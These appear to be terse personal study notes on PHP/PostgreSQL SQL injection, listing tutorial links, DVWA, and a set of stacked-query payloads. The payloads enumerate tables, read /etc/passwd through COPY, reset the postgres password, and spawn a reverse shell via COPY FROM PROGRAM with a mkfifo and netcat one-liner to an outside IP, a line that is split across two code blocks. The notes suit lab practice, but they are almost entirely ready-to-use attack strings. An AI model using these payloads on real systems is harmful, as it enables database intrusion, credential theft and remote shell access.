1. sqlinjection wiith comment https://www.sqlinjection.net/comments/
2. dvwa

# PHP SQL injection 
1. https://brightsec.com/blog/php-sql-injection/
```
'; SELECT * FROM pg_catalog.pg_tables
 WHERE schemaname != 'pg_catalog' AND 
   schemaname != 'information_schema'; -- 
```
```
'; SELECT version(),version(); -- 
```
```
'; CREATE TABLE temp(t TEXT);COPY temp FROM '/etc/passwd';SELECT * FROM temp;  -- 
```
```
'; CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.
```
```
16.40 1234 >/tmp/f'; --
```
```
'; ALTER USER postgres WITH PASSWORD 'newpassword'; -- 
```
